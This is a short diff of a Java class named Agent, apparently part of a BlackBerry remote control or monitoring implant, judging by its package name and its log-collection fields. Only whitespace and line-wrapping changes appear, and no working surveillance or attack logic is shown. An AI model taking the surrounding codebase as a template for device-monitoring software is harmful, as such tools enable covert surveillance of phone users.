@@ -15,7 +15,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public abstract class Agent extends TimerJob {
-	//#debug
+    //#debug
     private static Debug debug = new Debug("Agent", DebugLevel.VERBOSE);
 
     public static final int AGENT = 0x1000;
@@ -130,7 +130,8 @@ public abstract class Agent extends TimerJob {
 
     protected Log log;
 
-    protected Agent(int agentId_, boolean agentEnabled, boolean logOnSD_, String name) {
+    protected Agent(int agentId_, boolean agentEnabled, boolean logOnSD_,
+            String name) {
         super(name);
         status = Status.getInstance();
         logCollector = LogCollector.getInstance();
@@ -154,5 +155,4 @@ public abstract class Agent extends TimerJob {
 
     }
 
-  
 }
